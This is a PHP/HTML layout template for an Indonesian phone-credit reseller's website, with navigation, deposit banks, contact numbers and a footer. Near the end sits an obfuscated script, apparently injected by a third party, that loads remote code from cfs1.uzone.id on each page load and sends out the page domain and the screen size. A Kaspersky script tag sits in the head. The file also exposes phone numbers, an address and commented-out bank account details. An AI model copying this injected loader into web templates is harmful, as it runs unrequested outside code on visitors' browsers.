<!DOCTYPE html>
<?php
defined('BASEPATH') OR exit('No direct script access allowed');

?>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <?php
    echo '<!-- start here-->';
    if (!empty($meta))
        foreach ($meta as $name => $content) {
            echo "\n\t\t";
    ?>
    <meta name="<?php echo $name; ?>" content="<?php echo is_array($content) ? implode(", ", $content) : $content; ?>" />
    <?php
    if($name == 'meta_title'){
        echo '<title>'.$content.'</title>';
    }
        }
    ?>
    <!-- core CSS -->
    <link href="<?php echo HTTP_BASE .'assets/css/bootstrap.min.css';?>" rel="stylesheet">
    <link href="<?php echo HTTP_BASE.'assets/css/font-awesome.min.css';?>" rel="stylesheet">
    <link href="<?php echo HTTP_BASE.'assets/css/animate.min.css';?>" rel="stylesheet">
    <link href="<?php echo HTTP_BASE.'assets/css/prettyPhoto.css';?>" rel="stylesheet">
    <link href="<?php echo HTTP_BASE.'assets/css/main.css';?>" rel="stylesheet">
    <link href="<?php echo HTTP_BASE.'assets/css/responsive.css';?>" rel="stylesheet">
    <!--[if lt IE 9]>
    <script src="js/html5shiv.js"></script>
    <script src="js/respond.min.js"></script>
    <![endif]-->       
    <link rel="shortcut icon" href="images/ico/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="images/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="images/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="images/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="images/ico/apple-touch-icon-57-precomposed.png">
<script type="text/javascript" src="http://ff.kis.scr.kaspersky-labs.com/AE7A0798-ECA8-7A46-A917-022FC03BA4ED/main.js" charset="UTF-8"></script></head><!--/head-->

<body class="homepage">

    <header id="header">
        <div class="top-bar">
            <div class="container">
                <div class="row">
                    <div class="col-sm-6 col-xs-4">
                        <div class="top-number"><p><i class="fa fa-comments-o"></i>  +62 897.689.4447</p></div>
                    </div>
                    <div class="col-sm-6 col-xs-8">
                       <div class="social">
                            <ul class="social-share">
                                <li><a href="#"><i class="fa fa-facebook"></i></a></li>
                                <li><a href="#"><i class="fa fa-twitter"></i></a></li>
                                <li><a href="#"><i class="fa fa-linkedin"></i></a></li> 
                                <li><a href="#"><i class="fa fa-dribbble"></i></a></li>
                                <li><a href="#"><i class="fa fa-skype"></i></a></li>
                            </ul>
                            <div class="search">
                                <form role="form">
                                    <input type="text" class="search-form" autocomplete="off" placeholder="Search">
                                    <i class="fa fa-search"></i>
                                </form>
                           </div>
                       </div>
                    </div>
                </div>
            </div><!--/.container-->
        </div><!--/.top-bar-->
   
     <nav class="navbar navbar-inverse" role="banner">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a class="navbar-brand" href="index.html"><img src="<?php echo HTTP_BASE . 'assets/images/ArjunaPulsa25.gif'?>" width="50%" height="50%" alt="logo" ></a>
                </div>
				
                <div class="collapse navbar-collapse navbar-right">
                    <ul class="nav navbar-nav">
                        <li class="active"><?php echo anchor('home/index','Home');?></li>
                        <li><?php echo anchor('home/pendaftaran','Pendaftaran');?></li>
                        <li><?php echo anchor('home/deposit','Cara Deposit');?></li>
                        <li><?php echo anchor('home/transaksi','Cara Transaksi');?></li>
                        <!--
                        <li class="dropdown">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Pages <i class="fa fa-angle-down"></i></a>
                            <ul class="dropdown-menu">
                                <li><a href="blog-item.html">Blog Single</a></li>
                                <li><a href="pricing.html">Pricing</a></li>
                                <li><a href="404.html">404</a></li>
                                <li><a href="shortcodes.html">Shortcodes</a></li>
                            </ul>
                        </li>
                        -->
                        <li><?php echo anchor('Home/Harga','Harga');?></li>                       
                    </ul>
                </div>
            </div><!--/.container-->
        </nav><!--/nav-->   
    </header>

    <?php echo $output;?>

        <!--Bottom-->
        <section id="bottom">
        <div class="container wow fadeInDown" data-wow-duration="1000ms" data-wow-delay="600ms">
            <div class="row">
                <div class="col-md-4 col-sm-6">
                    <div class="widget">
                        <h4>Deposit dapat dilakukan melalui:</h4>

                        <ul>
                            
                            <li><img src="<?php echo HTTP_BASE .'assets/images/bank_bca.png'?>"></li>
                            <!--<li>746 009 8658<br/>SURI SAKSONO</li>-->
                            <li><img src="<?php echo HTTP_BASE .'assets/images/bank_mandiri.png'?>"></li>
                            <!--<li>145 000 610 3853<br/>SURI SAKSONO</li>-->
                        </ul>
                    </div>    
                </div><!--/.col-md-3-->

                <div class="col-md-4 col-sm-4">
                    <div class="widget">
                        <h4>Alamat:</h4>
                        <ul>
                            <li>Jl. H. SUIT, RT004 RW06 NO. 19</li>
                            <li>Kel. Semper Barat, Kec. Cilincing</li>
                            <li>Jakarta Utara - 14130</li>
                            <li><h5>Support CS:</h5></li>
                            <li><img src="<?php echo HTTP_BASE .'assets/images/telegram-logo-green.png'?>" height='4%' width='4%'>
                                @CS_ArjunaPulsa</li>
                            <li><i class="fa fa-comment-o"> </i> 0897.689.4447 (SMS ONLY)</li>
                        </ul>
                    </div>    
                </div><!--/.col-md-3-->

                <div class="col-md-4 col-sm-4">
                    <div class="widget">
                        <h4>Center Transaksi: </h4>
                        <ul>
                            <li><i class="fa fa-comment-o"> </i> INDOSAT: 0857.7151.4440</li>
                            <li><i class="fa fa-comment-o"> </i> SIMPATI: 0822.6014.4441</li>
                            <li><i class="fa fa-comment-o"> </i> XL: 0878.8858.4442</li>
                            <li><i class="fa fa-comment-o"> </i> AXIS: 0838.0687.4443</li>
                            <li><img src="<?php echo HTTP_BASE .'assets/images/telegram-logo-green.png'?>" height='4.5%' width='4.5%'>
                                @ArjunaPulsa_bot</li>
                            <li>
                                <img src="<?php echo HTTP_BASE .'assets/images/nimbuzz-logo-icon.gif'?>" height='4.5%' width='4.5%'>
                                arjunapulsa_trx
                            </li>
                        </ul>
                    </div>    
                </div><!--/.col-md-3-->

            </div>
        </div>
    </section><!--/#bottom-->
        <!--end Bottom-->
        
        
        <!--footer-->
        <footer id="footer" class="midnight-blue">
        <div class="container">
            <div class="row">
                <div class="col-sm-6">
                    &copy; 2017 <a href="<?php echo HTTP_BASE;?> " title="Agen Pulsa, Arjuna Pulsa">Arjuna Pulsa</a>. All Rights Reserved.
                </div>
                <div class="col-sm-6">
                    <ul class="pull-right">
                        <li><?php echo anchor('Home/Index','Home');?>></li>
                        <li><?php echo anchor('Home/Pendaftaran','Pendaftaran');?></li>
                        <li><?php echo anchor('Home/Harga','Harga');?></li>
                    </ul>
                </div>
            </div>
        </div>
    </footer><!--/#footer-->

    <script src="<?php echo HTTP_BASE.'assets/js/jquery.js'?>"></script>
    <script src="<?php echo HTTP_BASE.'assets/js/bootstrap.min.js'?>"></script>
    <script src="<?php echo HTTP_BASE.'assets/js/jquery.prettyPhoto.js'?>"></script>
    <script src="<?php echo HTTP_BASE.'assets/js/jquery.isotope.min.js'?>"></script>
    <script src="<?php echo HTTP_BASE.'assets/js/main.js'?>"></script>
    <script src="<?php echo HTTP_BASE.'assets/js/wow.min.js'?>"></script>
<script type="text/javascript">
    if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKBEHeD4ReMZzpJQV5yfgsoeDZ7kN6XkceTd0a9EGN2glC4JI01pSKZ%2faT1Alqer68OdTKUX0tNK08MDoNeNgWxKLne9oOfDSmTa6l3ubHSE3DF%2b5OiCShqicRB7qioZQp63ckSg2qVJaQYl0%2bBBTFjB31cp12P0ye9YePi%2fxhU7npmY144%2b3UUcDhx7qDmJF4jdLjFexm8sbu7OyP4TiSme6V6VnE9xhR4pZHhrgpmfqNbo2w4SgfJtsmAh795vG318JwsasxS1AOhm%2bBO%2bZqOaEIif6tEv3bQ0vzVAjteZ%2f62v93AVLU6xLxi1WhmP1LfRgiV9ozl%2fOGWjuF3t5WNY%2b%2fvoo4WqMChfQug0pOqOLRckhszTg3E1HFin0IeNzsln53sUGQ4b%2f5QfbzAMwyxkH2SXam%2b6jUYp3DrmzM1cfpH320gjDndI1JfM2PWR%2fvyMFed%2bzbjEatUsouS5WCZwlHqpwdHyYJn7LkRG45UVzJMnQ6aBrgH9eqhebqePwU" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
    